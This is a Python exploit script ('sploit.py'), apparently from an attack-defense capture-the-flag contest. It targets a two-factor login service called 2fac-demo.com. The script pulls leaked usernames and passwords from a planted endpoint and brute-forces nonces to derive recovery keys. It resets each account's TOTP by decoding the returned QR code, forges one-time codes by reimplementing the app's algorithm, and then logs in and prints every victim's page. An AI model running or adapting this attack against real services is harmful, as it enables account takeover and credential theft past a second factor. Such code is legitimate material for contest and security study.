#!/usr/bin/env python
from io import BytesIO
import itertools
import functools
import hashlib
import re
import base64
import time
import datetime

import requests
from pyzbar.pyzbar import decode
from PIL import Image

DOMAIN = "2fac-demo.com"
APPSIG = bytes.fromhex(
    "3082032030820208020101300d06092a864886f70d01010b050030563118301606035504030c0f417262616c6573742053696269726931143012060355040a0c0b43345420427554205334443117301506035504070c0e53742e2050657465727362757267310b3009060355040613025255301e170d3233313032383030303830395a170d3438313032313030303830395a30563118301606035504030c0f417262616c6573742053696269726931143012060355040a0c0b43345420427554205334443117301506035504070c0e53742e2050657465727362757267310b300906035504061302525530820122300d06092a864886f70d01010105000382010f003082010a0282010100c00a80f2c18c26e08a63b2a58f8db7be9897f4e382ed0a3095d7fa65b2fcf4e0ae50e754d943ca5ad566bd18a029c4d2aee7940306c644ed2e43def8882bf321756565760ce6470de33c2e3767c81871a14a33b4cfc92a5d840bbb01873ee676802f4b286e07bee356ce294768decd19f55b989ef068fe22f5eb2bfe51b3301e97607d08e643bfca31732cc64182889b5fad15d2b0ddeddadd33b545b4f162447871a967e508ae5e0dae23eb0d4edd3c9c5d972613fc5c1d984b66acaf4e39d29c27713a729b9bf6511a9fad27ecaab3af4ae2de425aa9ee5cbe46320bcb9fb4447a01d99a98bf57faf03b785e1f790fa953e72e9dd230f3bfb8b4dc18359f5b0203010001300d06092a864886f70d01010b0500038201010076a91b5e01855adb0c3fd9745660dbc8e57a2f2433c72e0ab34be4ce90c303232889fbb6aef051bc3e0f384a03906a0342226a1ac6359c9297cb5040294012dac55ef22bfce8ea86a99e9f4a47e659b1568d605b49999b94deca1691118085bde7ecb3fb72cf6f315cce90f496cd4fdeb92210cd1c18d447f081c568ea68019f503c960d9e6ec73b7461b5ecb99a0b706c1140b2567a0c323e3bbc4e9a8db51cdf483acbd6cfacf2bff9650c2853d15631c6365351f1e0735c53fbf3becc55f0ce878d8e2d2c9e31a58f9a37f459805bc2938bdfdc285090f87a0e6758361e2fac71c6482ba2f0bb16437a4668e65087e3f80591fa29b348836b57ee05aabc21"
)


def fib(start: int, n: int):
    if n <= 1:
        return start
    a, b = start, start
    for _ in range(2, n + 1):
        a, b = b, a + b
    return b


def nonce(username: str, domain: str, n: int) -> str:
    salt = "".join(
        itertools.chain.from_iterable(
            itertools.zip_longest(username, domain, fillvalue="")
        )
    )
    return hashlib.sha256(f"{salt}-{fib(n, 18)}".encode()).hexdigest()


def totp(username: str, domain: str, secret: str) -> str:
    """
        val seed = (System.currentTimeMillis() / 1000L) / TOTP_INTERVAL_SECONDS

        val paramsForStr = Json(
            username = params.username,
            domain = params.domain,
            secret = params.secret
        )

        val digest = MessageDigest.getInstance("SHA-384")
            .digest("$seed-lol+$paramsForStr".toByteArray() + appSignature)
    """

    seed = int(datetime.datetime.now().timestamp()) // 30
    params = f"Json(username={username}, domain={domain}, secret={secret})"

    hash = hashlib.sha384(f"{seed}-lol+{params}".encode() + APPSIG).digest()

    """
        val word = wordlist[digest.fold(0xDEAD1337BEEFL) { a, b ->
            a * 2 + digest[(b.toUInt().mod(digest.size.toUInt())).toInt()]
        }.toInt().rem(wordlist.size).absoluteValue]
    """


    a  = 0xDEAD1337BEEF
    for b in hash:
        i = b if b < 128 else 2**32 - 256 + b
        i = i % 48
        x = hash[i]
        x = x if x < 128 else -256 + x
        a = a * 2 + x
        a = a & 0xFFFFFFFFFFFFFFFF
    idx = a
    idx = idx & 0xFFFFFFFF
    idx = idx | (-(idx & 0x80000000))
    if idx < 0:
        idx = -((-idx) % 2048)
    else:
        idx = idx % 2048
    idx = abs(idx)

    hash_digits = hash.hex().translate(str.maketrans("", "", "abcdef"))

    return f"{words[idx]}-{hash_digits[:2]}{hash_digits[-2:]}"


def hack(url: str):
    logins = requests.get(f"{url}/__pwned_by_Slonser__").text

    passwords = {}
    reset_keys = {}

    for un, pw, nonce_prefix in (line.split("\t") for line in logins.split("...\n")):
        passwords[un] = pw
        for x in range(20000):
            if nonce(un, DOMAIN, x).startswith(nonce_prefix.strip(".")):
                break
        else:
            print(f"{un}\t not found!")

        key = []
        x = fib(x, 18)
        for _ in range(3):
            key.append(words[x % 2048])
            x //= 2048
        key = "-".join(key)

        print(f"{un}:{pw}:{key}")
        reset_keys[un] = key

        # break  # !

    for un in reset_keys:
        req = requests.post(
            f"{url}/recover",
            data={"username": un, "password": passwords[un], "2fac": reset_keys[un]},
        )

        src = re.findall(
            r'src="data:image/png;base64,([-A-Za-z0-9+/]*={0,3})"', req.text
        )[0]
        img = Image.open(BytesIO(base64.b64decode(src)))

        new_totp = decode(img)[0].data.decode()
        print(new_totp)
        _, domain, secret, _ = new_totp.split("\n")
        
        code = totp(un, domain, secret)
        
        s = requests.session()
        s.post(f"{url}/login", data={"username": un, "password": passwords[un], "2fac": code})
        
        page = s.get(f"{url}/").text

        print(f"----- {un} {code} -----")
        print(page)

if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("usage: sploit.py url", file=sys.stderr)
        sys.exit(1)

    with open("./words.txt") as f:
        words = f.read().split("\n")

    hack(sys.argv[1])
